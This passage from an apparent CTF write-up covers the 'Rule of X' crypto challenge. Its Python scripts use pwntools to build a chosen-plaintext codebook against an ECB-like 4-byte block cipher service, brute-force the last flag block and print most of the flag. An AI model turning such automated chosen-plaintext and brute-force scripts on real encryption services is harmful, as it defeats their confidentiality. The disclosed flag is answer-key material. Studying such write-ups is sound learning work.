</span></span><span class="line"><span class="cl">                <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">SLEEP</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">mapping</span><span class="p">)</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">needed</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">decoded</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">mapping</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="s1">&#39;?&#39;</span><span class="p">)</span> <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">flag_tokens</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Mapped </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">mapping</span><span class="p">)</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">needed</span><span class="p">)</span><span class="si">}</span><span class="s2"> tokens&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">decoded</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">solve</span><span class="p">())</span>
</span></span></code></pre></div><h3 id="rule-of-x">Rule of X<a hidden class="anchor" aria-hidden="true" href="#rule-of-x">#</a></h3>
<h4 id="analysis-9">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis-9">#</a></h4>
<p>The challenge is a service where we can do two things:</p>
<ul>
<li>Encrypt a story that contains the flag</li>
<li>Encrypt a plaintext of our choice</li>
</ul>
<pre tabindex="0"><code>Welcome to The Dream of Poliphilus!
1. Get a story and a flag
2. Encrypt plaintext
&gt;
</code></pre><p>By encrypting some plaintexts, I found that a 4-byte block always maps to another 4-byte block (ECB-like).</p>
<pre tabindex="0"><code>&gt; aaaa1
Ciphertext:
46d08e66 948d0fbf

&gt; aaaa
Ciphertext:
46d08e66 31a3a187

&gt; 1
Ciphertext:
948d0fbf
</code></pre><h4 id="solution-9">Solution<a hidden class="anchor" aria-hidden="true" href="#solution-9">#</a></h4>
<p>Given that a 4-byte block always maps to another 4-byte block, to decrypt the whole text we would need to send every possible combination of 4 characters to be encrypted&hellip; or would we?</p>
<p>In fact, we don&rsquo;t care about the entire text, we just need the flag. Knowing the flag format (CTF{hexvalues}), we can narrow down the alphabet to encrypt.</p>
<p>So we arrive at this solution:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">product</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">tqdm</span> <span class="kn">import</span> <span class="n">trange</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;critical&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">alphabet</span> <span class="o">=</span> <span class="s1">&#39;CTF</span><span class="si">{}</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="s1">&#39;0123456789abcdef&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">combs</span> <span class="o">=</span> <span class="n">product</span><span class="p">(</span><span class="n">alphabet</span><span class="p">,</span> <span class="n">repeat</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">combs</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">output</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">blocks</span> <span class="o">=</span> <span class="p">[</span><span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="mi">4</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">trange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">blocks</span><span class="p">),</span> <span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;28267ab8.ctf.ac.upt.ro&#39;</span><span class="p">,</span> <span class="mi">9323</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">blocks</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">100</span><span class="p">])</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">output</span> <span class="o">+=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()[:</span><span class="o">-</span><span class="mi">8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">mappings</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">output</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span> <span class="o">==</span> <span class="mi">0</span><span class="p">,</span> <span class="s2">&#34;Encrypted output length should be a multiple of 8&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">output</span><span class="p">),</span> <span class="mi">8</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">enc_chunk</span> <span class="o">=</span> <span class="n">output</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span>            <span class="c1"># 8-byte ciphertext block</span>
</span></span><span class="line"><span class="cl">    <span class="n">plain_idx</span> <span class="o">=</span> <span class="n">i</span> <span class="o">//</span> <span class="mi">2</span>                   <span class="c1"># maps to corresponding 4-byte plaintext start</span>
</span></span><span class="line"><span class="cl">    <span class="n">plain_chunk</span> <span class="o">=</span> <span class="n">payload</span><span class="p">[</span><span class="n">plain_idx</span><span class="p">:</span><span class="n">plain_idx</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">mappings</span><span class="p">[</span><span class="n">enc_chunk</span><span class="p">]</span> <span class="o">=</span> <span class="n">plain_chunk</span>
</span></span><span class="line"><span class="cl">   
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;28267ab8.ctf.ac.upt.ro&#39;</span><span class="p">,</span> <span class="mi">9323</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">flag_enc</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag_enc</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span> <span class="o">==</span> <span class="mi">0</span><span class="p">,</span> <span class="s2">&#34;Encrypted flag length should be a multiple of 8&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">decoded_blocks</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag_enc</span><span class="p">),</span> <span class="mi">8</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">c</span> <span class="o">=</span> <span class="n">flag_enc</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">decoded_blocks</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">mappings</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="s1">&#39;????&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">flag_dec</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">decoded_blocks</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Flag: </span><span class="si">{</span><span class="n">flag_dec</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span></code></pre></div><p>But there&rsquo;s a problem: this code can&rsquo;t extract the whole flag. The output is:</p>
<pre tabindex="0"><code>????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????F{0b3d4dd2dfa538c778f815b824da290e60ebc6d6116fcb94acc76a232fe811????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
</code></pre><p>We can spot the start &lsquo;F{&hellip;&rsquo; and prepend &lsquo;CT&rsquo;, but how do we get the last block?</p>
<p>Consider what the last block contains: 4 characters, the first two are hex digits, then a closing curly bracket, and a random character (that&rsquo;s why the first script couldn&rsquo;t decode everything).</p>
<p>Based on this, we can brute-force the two hex characters and the last character, thus extracting the final flag block.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">for</span> <span class="n">tup</span> <span class="ow">in</span> <span class="n">trange</span><span class="p">(</span><span class="mi">255</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">trange</span><span class="p">(</span><span class="mi">255</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">isprintable</span><span class="p">():</span> <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="n">brute</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">tup</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="s2">&#34;}&#34;</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;28267ab8.ctf.ac.upt.ro&#39;</span><span class="p">,</span> <span class="mi">9323</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="n">brute</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">output</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">output</span><span class="p">[:</span><span class="mi">8</span><span class="p">]</span> <span class="ow">in</span> <span class="n">flag_enc</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Found matching plaintext: </span><span class="si">{</span><span class="n">brute</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">tup</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">output</span><span class="p">[:</span><span class="mi">8</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;No matching 4-byte plaintext found in given alphabet.&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>Which outputs -&gt; <strong><code>e7}H</code></strong></p>
<h4 id="script-8">Script<a hidden class="anchor" aria-hidden="true" href="#script-8">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">product</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">tqdm</span> <span class="kn">import</span> <span class="n">trange</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;critical&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">alphabet</span> <span class="o">=</span> <span class="s1">&#39;CTF</span><span class="si">{}</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="s1">&#39;0123456789abcdef&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">combs</span> <span class="o">=</span> <span class="n">product</span><span class="p">(</span><span class="n">alphabet</span><span class="p">,</span> <span class="n">repeat</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">combs</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">output</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">blocks</span> <span class="o">=</span> <span class="p">[</span><span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="mi">4</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">trange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">blocks</span><span class="p">),</span> <span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;28267ab8.ctf.ac.upt.ro&#39;</span><span class="p">,</span> <span class="mi">9323</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">blocks</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">100</span><span class="p">])</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">output</span> <span class="o">+=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()[:</span><span class="o">-</span><span class="mi">8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">mappings</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">output</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span> <span class="o">==</span> <span class="mi">0</span><span class="p">,</span> <span class="s2">&#34;Encrypted output length should be a multiple of 8&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">output</span><span class="p">),</span> <span class="mi">8</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">enc_chunk</span> <span class="o">=</span> <span class="n">output</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span>            <span class="c1"># 8-byte ciphertext block</span>
</span></span><span class="line"><span class="cl">    <span class="n">plain_idx</span> <span class="o">=</span> <span class="n">i</span> <span class="o">//</span> <span class="mi">2</span>                   <span class="c1"># maps to corresponding 4-byte plaintext start</span>
</span></span><span class="line"><span class="cl">    <span class="n">plain_chunk</span> <span class="o">=</span> <span class="n">payload</span><span class="p">[</span><span class="n">plain_idx</span><span class="p">:</span><span class="n">plain_idx</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">mappings</span><span class="p">[</span><span class="n">enc_chunk</span><span class="p">]</span> <span class="o">=</span> <span class="n">plain_chunk</span>
</span></span><span class="line"><span class="cl">   
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;28267ab8.ctf.ac.upt.ro&#39;</span><span class="p">,</span> <span class="mi">9323</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">flag_enc</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag_enc</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span> <span class="o">==</span> <span class="mi">0</span><span class="p">,</span> <span class="s2">&#34;Encrypted flag length should be a multiple of 8&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">decoded_blocks</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag_enc</span><span class="p">),</span> <span class="mi">8</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">c</span> <span class="o">=</span> <span class="n">flag_enc</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">decoded_blocks</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">mappings</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="s1">&#39;????&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">flag_dec</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">decoded_blocks</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Flag: </span><span class="si">{</span><span class="n">flag_dec</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;flag.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">flag_dec</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">tup</span> <span class="ow">in</span> <span class="n">trange</span><span class="p">(</span><span class="mi">255</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">trange</span><span class="p">(</span><span class="mi">255</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">isprintable</span><span class="p">():</span> <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="n">brute</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">tup</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="s2">&#34;}&#34;</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;28267ab8.ctf.ac.upt.ro&#39;</span><span class="p">,</span> <span class="mi">9323</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="n">brute</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">output</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">output</span><span class="p">[:</span><span class="mi">8</span><span class="p">]</span> <span class="ow">in</span> <span class="n">flag_enc</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Found matching plaintext: </span><span class="si">{</span><span class="n">brute</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">tup</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">output</span><span class="p">[:</span><span class="mi">8</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;No matching 4-byte plaintext found in given alphabet.&#34;</span><span class="p">)</span>
</span></span></code></pre></div><h2 id="miscellaneous-">Miscellaneous üêß<a hidden class="anchor" aria-hidden="true" href="#miscellaneous-">#</a></h2>
<h3 id="full-house-poker">Full-House Poker<a hidden class="anchor" aria-hidden="true" href="#full-house-poker">#</a></h3>
<h4 id="analysis-10">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis-10">#</a></h4>
